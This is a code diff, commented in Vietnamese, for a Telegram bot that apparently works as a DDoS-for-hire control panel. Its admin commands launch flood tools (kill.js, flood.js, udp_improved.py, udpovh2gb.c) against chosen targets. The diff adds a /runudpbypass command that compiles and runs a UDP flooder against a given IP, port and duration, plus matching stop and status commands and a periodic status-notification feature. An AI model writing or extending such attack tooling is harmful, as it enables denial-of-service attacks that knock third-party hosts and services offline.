@@ -318,6 +318,101 @@ def log_command(func):
 running_tasks = {}
 executor = ThreadPoolExecutor(max_workers=5)
 
+# ========== Hệ thống thông báo tự động ==========
+
+auto_notification_enabled = True
+auto_notification_interval = 25 * 60  # 25 phút = 1500 giây
+auto_notification_timer = None
+auto_notification_chats = set()  # Lưu trữ các chat_id để gửi thông báo
+
+def start_auto_notification():
+    """Bắt đầu hệ thống thông báo tự động"""
+    global auto_notification_timer
+    if auto_notification_timer:
+        auto_notification_timer.cancel()
+    
+    def send_auto_notification():
+        if not auto_notification_enabled or not auto_notification_chats:
+            return
+        
+        try:
+            # Lấy thống kê hệ thống
+            uptime = get_uptime()
+            total_users = 0
+            total_admins = 0
+            today_activities = 0
+            
+            try:
+                with db.get_connection() as conn:
+                    cursor = conn.cursor()
+                    cursor.execute('SELECT COUNT(*) FROM users')
+                    total_users = cursor.fetchone()[0]
+                    cursor.execute('SELECT COUNT(*) FROM users WHERE is_admin=1')
+                    total_admins = cursor.fetchone()[0]
+                    cursor.execute('SELECT COUNT(*) FROM activity_logs WHERE date(timestamp) = date("now")')
+                    today_activities = cursor.fetchone()[0]
+            except Exception as e:
+                logger.error(f"Error getting stats for auto notification: {e}")
+            
+            # Đếm số tác vụ đang chạy
+            running_tasks_count = sum(1 for proc in running_tasks.values() if proc and proc.poll() is None)
+            
+            # Tạo thông báo
+            notification_msg = (
+                f"🤖 *BÁO CÁO TÌNH TRẠNG HOẠT ĐỘNG*\n"
+                f"⏰ Thời gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
+                f"🕐 Uptime: {uptime}\n"
+                f"👥 Tổng users: {total_users}\n"
+                f"👑 Admins: {total_admins}\n"
+                f"📈 Hoạt động hôm nay: {today_activities}\n"
+                f"🔄 Tác vụ đang chạy: {running_tasks_count}\n"
+                f"💚 Bot hoạt động bình thường"
+            )
+            
+            # Gửi thông báo đến tất cả chat đã đăng ký
+            for chat_id in list(auto_notification_chats):
+                try:
+                    bot.send_message(chat_id, notification_msg, parse_mode='Markdown')
+                    logger.info(f"Auto notification sent to chat {chat_id}")
+                except Exception as e:
+                    logger.error(f"Failed to send auto notification to chat {chat_id}: {e}")
+                    # Xóa chat_id không hợp lệ
+                    auto_notification_chats.discard(chat_id)
+            
+            # Lập lịch gửi thông báo tiếp theo
+            if auto_notification_enabled:
+                start_auto_notification()
+                
+        except Exception as e:
+            logger.error(f"Error in auto notification: {e}")
+            # Thử lại sau 5 phút nếu có lỗi
+            if auto_notification_enabled:
+                threading.Timer(5 * 60, start_auto_notification).start()
+    
+    # Lập lịch gửi thông báo đầu tiên
+    auto_notification_timer = threading.Timer(auto_notification_interval, send_auto_notification)
+    auto_notification_timer.start()
+    logger.info(f"Auto notification system started - will send status every {auto_notification_interval//60} minutes")
+
+def stop_auto_notification():
+    """Dừng hệ thống thông báo tự động"""
+    global auto_notification_timer, auto_notification_enabled
+    auto_notification_enabled = False
+    if auto_notification_timer:
+        auto_notification_timer.cancel()
+        auto_notification_timer = None
+    logger.info("Auto notification system stopped")
+
+def add_auto_notification_chat(chat_id):
+    """Thêm chat vào danh sách nhận thông báo tự động"""
+    auto_notification_chats.add(chat_id)
+    logger.info(f"Chat {chat_id} added to auto notification list")
+
+def remove_auto_notification_chat(chat_id):
+    """Xóa chat khỏi danh sách nhận thông báo tự động"""
+    auto_notification_chats.discard(chat_id)
+    logger.info(f"Chat {chat_id} removed from auto notification list")
+
 def run_subprocess_async(command_list, user_id, chat_id, task_key, message):
     key = (user_id, chat_id, task_key)
     proc = running_tasks.get(key)
@@ -484,17 +579,21 @@ def cmd_help(message):
                 "/admin [password] - Đăng nhập admin\n"
                 "/addadmin <user_id> - Cấp quyền admin cho người khác\n"
                 "/runkill target time rate threads [proxyfile] - Chạy kill.js\n"
-                "/runudp host port method - Chạy udp_improved.py\n"                
+                "/runudp host port method - Chạy udp_improved.py\n"
+                "/runudpbypass ip port duration [packet_size] [burst] - Chạy udpbypass.c\n"
                 "/runovh host port duration threads - Chạy udpovh2gb.c\n"
                 "/runflood host time threads rate - Chạy flood.js\n"
                 "/stopkill - Dừng kill.js\n"
                 "/stopudp - Dừng udp_improved.py\n"
+                "/stopudpbypass - Dừng udpbypass\n"
                 "/stopflood - Dừng flood.js\n"
                 "/scrapeproxies - Thu thập proxies\n"
                 "/stopproxies - Dừng thu thập proxies\n"
                 "/statuskill - Trạng thái kill.js\n"
                 "/statusudp - Trạng thái udp_improved.py\n"
+                "/statusudpbypass - Trạng thái udpbypass\n"
                 "/statusflood - Trạng thái flood.js\n"
+                "/autonotify - Quản lý thông báo tự động\n"
             )
         try:
             sent = bot.send_message(message.chat.id, escape_markdown_v2(help_text), parse_mode='MarkdownV2')
@@ -758,6 +857,95 @@ def cmd_runudp(message):
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
 
+@bot.message_handler(commands=['runudpbypass'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_runudpbypass(message):
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /runudpbypass...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
+        args = message.text.split()
+        if len(args) < 4 or len(args) > 6:
+            bot.edit_message_text(
+                "⚠️ Cách dùng: /runudpbypass <ip> <port> <duration> [packet_size=1472] [burst=1024]\n"
+                "Ví dụ: /runudpbypass 1.2.3.4 80 60\n"
+                "Ví dụ: /runudpbypass 1.2.3.4 80 60 1024 512",
+                chat_id=message.chat.id,
+                message_id=processing_msg.message_id
+            )
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            return
+
+        ip = args[1]
+        port = args[2]
+        duration = args[3]
+        packet_size = args[4] if len(args) > 4 else "1472"
+        burst_size = args[5] if len(args) > 5 else "1024"
+
+        # Kiểm tra nếu file udpbypass chưa được compile
+        if not os.path.isfile('udpbypass') and not os.path.isfile('udpbypass.exe'):
+            if os.name == 'nt':  # Windows
+                bot.edit_message_text(
+                    "⚠️ File udpbypass.exe không tồn tại. Vui lòng compile udpbypass.c trước.",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+                return
+            else:  # Unix/Linux
+                compile_cmd = ['gcc', '-o', 'udpbypass', 'udpbypass.c', '-pthread']
+                bot.edit_message_text(
+                    "🔧 Đang compile udpbypass.c ...",
+                    chat_id=message.chat.id,
+                    message_id=processing_msg.message_id
+                )
+                compile_proc = subprocess.run(compile_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+                if compile_proc.returncode != 0:
+                    bot.edit_message_text(
+                        f"❌ Lỗi compile udpbypass.c:\n{compile_proc.stderr.decode(errors='ignore')}",
+                        chat_id=message.chat.id,
+                        message_id=processing_msg.message_id
+                    )
+                    auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+                    return
+
+        # Use different approach for Windows vs Unix
+        if os.name == 'nt':  # Windows
+            cmd = ['udpbypass.exe', ip, port, duration, packet_size, burst_size]
+        else:  # Unix/Linux
+            cmd = ['./udpbypass', ip, port, duration, packet_size, burst_size]
+        
+        # Cập nhật thông báo thành công
+        bot.edit_message_text(
+            f"✅ Lệnh /runudpbypass đã được nhận!\n"
+            f"🎯 IP: {ip}\n"
+            f"🔌 Port: {port}\n"
+            f"⏱️ Duration: {duration}s\n"
+            f"📦 Packet Size: {packet_size}\n"
+            f"💥 Burst Size: {burst_size}\n\n"
+            f"🔄 Đang khởi động tác vụ...",
+            chat_id=message.chat.id,
+            message_id=processing_msg.message_id
+        )
+        
+        run_subprocess_async(cmd, message.from_user.id, message.chat.id, 'udpbypass', message)
+    except Exception as e:
+        logger.error(f"Error /runudpbypass: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi trong quá trình xử lý lệnh /runudpbypass: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi trong quá trình xử lý lệnh /runudpbypass: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
+
 @bot.message_handler(commands=['runovh'])
 @ignore_old_messages
 @not_banned
@@ -965,7 +1153,7 @@ def cmd_statusovh(message):
         )
     auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
 
-@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood'])
+@bot.message_handler(commands=['stopkill', 'stopudp', 'stopproxies', 'stopflood', 'stopudpbypass'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -995,6 +1183,9 @@ def cmd_stop_task(message):
         elif cmd.startswith('/stopflood'):
             task_name = "flood"
             stop_subprocess(user_id, chat_id, 'flood', message)
+        elif cmd.startswith('/stopudpbypass'):
+            task_name = "udpbypass"
+            stop_subprocess(user_id, chat_id, 'udpbypass', message)
         
         # Cập nhật thông báo
         bot.edit_message_text(
@@ -1013,7 +1204,7 @@ def cmd_stop_task(message):
             sent = bot.reply_to(message, f"❌ Lỗi khi dừng tác vụ: {str(e)}")
             auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
 
-@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood'])
+@bot.message_handler(commands=['statuskill', 'statusudp', 'statusproxies', 'statusflood', 'statusudpbypass'])
 @ignore_old_messages
 @not_banned
 @admin_required
@@ -1037,6 +1228,8 @@ def cmd_status_task(message):
             task_key = 'scrapeproxies'
         elif 'flood' in cmd:
             task_key = 'flood'
+        elif 'udpbypass' in cmd:
+            task_key = 'udpbypass'
         else:
             bot.edit_message_text(
                 "❌ Lệnh không hợp lệ.",
@@ -1129,6 +1322,103 @@ def cmd_scrapeproxies(message):
                             message_id=processing_msg.message_id)
         auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
 
+@bot.message_handler(commands=['autonotify'])
+@ignore_old_messages
+@not_banned
+@admin_required
+@log_command
+def cmd_autonotify(message):
+    """Quản lý hệ thống thông báo tự động"""
+    try:
+        # Gửi thông báo đang xử lý trước khi xóa tin nhắn lệnh
+        processing_msg = bot.reply_to(message, "🔄 Đang xử lý lệnh /autonotify...")
+        
+        # Xóa tin nhắn lệnh sau khi đã gửi thông báo
+        delete_message_immediately(message.chat.id, message.message_id)
+        
+        args = message.text.split()
+        if len(args) < 2:
+            # Hiển thị trạng thái hiện tại
+            status_text = (
+                f"📊 *TRẠNG THÁI THÔNG BÁO TỰ ĐỘNG*\n\n"
+                f"🔔 Trạng thái: {'✅ Bật' if auto_notification_enabled else '❌ Tắt'}\n"
+                f"⏰ Chu kỳ: {auto_notification_interval//60} phút\n"
+                f"💬 Số chat nhận thông báo: {len(auto_notification_chats)}\n"
+                f"🔄 Tác vụ đang chạy: {sum(1 for proc in running_tasks.values() if proc and proc.poll() is None)}\n\n"
+                f"📋 *Cách sử dụng:*\n"
+                f"`/autonotify on` - Bật thông báo tự động\n"
+                f"`/autonotify off` - Tắt thông báo tự động\n"
+                f"`/autonotify add` - Thêm chat này vào danh sách nhận thông báo\n"
+                f"`/autonotify remove` - Xóa chat này khỏi danh sách nhận thông báo\n"
+                f"`/autonotify test` - Gửi thông báo test ngay lập tức"
+            )
+            
+            bot.edit_message_text(status_text, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=30)
+            return
+        
+        action = args[1].lower()
+        chat_id = message.chat.id
+        
+        if action == 'on':
+            if auto_notification_enabled:
+                bot.edit_message_text("ℹ️ Hệ thống thông báo tự động đã được bật rồi!", 
+                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
+            else:
+                auto_notification_enabled = True
+                start_auto_notification()
+                bot.edit_message_text("✅ Đã bật hệ thống thông báo tự động!", 
+                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            
+        elif action == 'off':
+            if not auto_notification_enabled:
+                bot.edit_message_text("ℹ️ Hệ thống thông báo tự động đã được tắt rồi!", 
+                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
+            else:
+                stop_auto_notification()
+                bot.edit_message_text("✅ Đã tắt hệ thống thông báo tự động!", 
+                                    chat_id=message.chat.id, message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            
+        elif action == 'add':
+            add_auto_notification_chat(chat_id)
+            bot.edit_message_text("✅ Đã thêm chat này vào danh sách nhận thông báo tự động!", 
+                                chat_id=message.chat.id, message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            
+        elif action == 'remove':
+            remove_auto_notification_chat(chat_id)
+            bot.edit_message_text("✅ Đã xóa chat này khỏi danh sách nhận thông báo tự động!", 
+                                chat_id=message.chat.id, message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            
+        elif action == 'test':
+            # Gửi thông báo test ngay lập tức
+            test_msg = (
+                f"🧪 *THÔNG BÁO TEST*\n"
+                f"⏰ Thời gian: {datetime.now().strftime('%H:%M:%S %d/%m/%Y')}\n"
+                f"💚 Hệ thống thông báo tự động hoạt động bình thường!\n"
+                f"🔄 Sẽ gửi thông báo tiếp theo sau {auto_notification_interval//60} phút"
+            )
+            bot.edit_message_text(test_msg, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=15)
+            
+        else:
+            bot.edit_message_text("❌ Hành động không hợp lệ. Sử dụng: on, off, add, remove, test", 
+                                chat_id=message.chat.id, message_id=processing_msg.message_id)
+            auto_delete_response(message.chat.id, message.message_id, processing_msg, delay=10)
+            
+    except Exception as e:
+        logger.error(f"Error in /autonotify: {e}")
+        try:
+            bot.edit_message_text(f"❌ Có lỗi xảy ra: {str(e)}", 
+                                chat_id=message.chat.id, 
+                                message_id=processing_msg.message_id)
+        except:
+            sent = bot.reply_to(message, f"❌ Có lỗi xảy ra: {str(e)}")
+            auto_delete_response(message.chat.id, message.message_id, sent, delay=10)
+
 # ========== Handler cho tin nhắn không được nhận diện ==========
 
 @bot.message_handler(func=lambda message: True)
@@ -1167,6 +1457,13 @@ def main():
     except Exception as e:
         logger.error(f"❌ Invalid bot token or connection failed: {e}")
         sys.exit(1)
+    
+    # Khởi động hệ thống thông báo tự động
+    try:
+        start_auto_notification()
+        logger.info("🔔 Hệ thống thông báo tự động đã được khởi động")
+    except Exception as e:
+        logger.error(f"❌ Không thể khởi động hệ thống thông báo tự động: {e}")
     
     retry_count = 0
     max_retries = 5
